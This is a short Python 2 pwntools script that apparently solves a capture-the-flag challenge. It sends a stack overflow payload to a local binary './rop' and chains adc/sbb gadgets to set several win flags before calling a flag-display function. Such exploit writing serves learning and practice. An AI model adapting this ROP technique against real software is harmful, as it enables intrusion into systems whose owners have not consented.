#!/usr/bin/env python2
from pwn import *
from struct import pack
base = 0x8048000
adc_al = base+0x00000b91
sbb_al = base+0x00000504
leapA = 0x080485E6
setFlagInLeapA = 0x080485F3
displayFlag = 0x080486B3
payload = "AAAAAAAAAAAAAAAABBBBCCCCDDDD"
payload += pack("<I",leapA) # eax now contains address of win1@bss, incrementing this address allows us to set win2 and win3 flags
# we can only add 0x41 or subtract 0x24
# 0x41-0x24+0x41-0x24-0x24+0x41-0x24-0x24+0x41-0x24-0x24+0x41-0x24-0x24
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",sbb_al)
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",sbb_al)
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",sbb_al)
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",sbb_al) # now eax is greater by 1
payload += pack("<I",setFlagInLeapA)
payload += pack("<I",0)
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",sbb_al)
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",sbb_al)
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",sbb_al)
payload += pack("<I",adc_al)
payload += pack("<I",sbb_al)
payload += pack("<I",sbb_al) # now eax is greater by 1
payload += pack("<I",setFlagInLeapA)
payload += pack("<I",0)
payload += pack("<I",displayFlag)
#print(payload)
p = process("./rop")
p.sendline(payload)
p.interactive()